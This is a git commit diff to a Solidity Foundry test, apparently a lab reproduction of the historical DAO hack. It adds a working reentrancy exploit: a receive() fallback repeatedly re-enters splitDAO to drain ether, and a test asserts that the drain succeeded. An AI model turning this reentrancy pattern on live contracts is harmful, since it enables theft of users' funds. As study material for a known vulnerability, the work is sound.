de4a61fe025e19fe31ea7a211f311d24aafd93c9
Tiago de Paula <tiagodepalves@gmail.com>
2025-12-04 08:25:51 -0300

    feat: the DAO hack

--- test/DAOAttack.t.sol
+++ test/DAOAttack.t.sol
@@ -14,23 +14,25 @@ contract DAOTest is Test {
     }
 
     function test_initialState() external view {
-        vm.assertEq(address(DAO).balance, daoInitialBalance);
+        assertEq(address(DAO).balance, daoInitialBalance);
     }
 
     address constant BITTREX = 0xFBb1b73C4f0BDa4f67dcA266ce6Ef42f520fBB98;
 
     function test_balanceOf() external view {
-        vm.assertEq(DAO.balanceOf(BITTREX), 9.99 ether);
+        assertEq(DAO.balanceOf(BITTREX), 9.99 ether);
     }
 }
 
 contract DAOAttacker {
-    uint256 private proposalId;
+    uint256 constant MAX_DEPTH = 20;
 
     function buyTokens() external payable {
         (bool ok,) = address(DAO).call{ value: msg.value }("");
         require(ok, "Could not buy. Is it in Crowdsale?");
     }
+
+    uint256 private proposalId;
 
     function createProposal(string calldata description, uint256 debatingPeriod) external {
         require(proposalId == 0, "Another proposal was already made");
@@ -40,6 +42,23 @@ contract DAOAttacker {
     function vote(bool supportProposal) external returns (uint256 voteId) {
         require(proposalId != 0, "No proposal set");
         return DAO.vote(proposalId, supportProposal);
+    }
+
+    uint256 private depth;
+
+    function attack() external {
+        depth = 0;
+        bool ok = DAO.splitDAO(proposalId, address(this));
+        require(ok, "splitDAO failed");
+    }
+
+    // re-entrancy attack
+    receive() external payable {
+        if (DAO.balanceOf(address(this)) > 0 && depth < MAX_DEPTH) {
+            depth += 1;
+            bool ok = DAO.splitDAO(proposalId, address(this));
+            require(ok, "splitDAO failed");
+        }
     }
 }
 
@@ -61,11 +80,25 @@ contract DAOAttackTest is DAOTest {
     }
 
     function test_attackerIsHolder() external view {
-        vm.assertEq(DAO.balanceOf(address(attacker)), INITIAL_BALANCE);
+        assertEq(address(attacker).balance, 0);
+        assertEq(DAO.balanceOf(address(attacker)), INITIAL_BALANCE);
     }
 
     function test_canCreateProposal() external {
-        attacker.createProposal("A very non-sketchy proposal", 10 days);
+        attacker.createProposal("I propose we test stuff", 10 days);
         attacker.vote(false);
+    }
+
+    function test_attack() external {
+        attacker.createProposal("A very non-sketchy proposal", 10 days);
+        attacker.vote(true);
+
+        // wait for the proposal deadline
+        vm.warp(block.timestamp + 10 days);
+
+        attacker.attack();
+
+        assertEq(address(attacker).balance, 1_074_552_486);
+        assertEq(DAO.balanceOf(address(attacker)), 0);
     }
 }
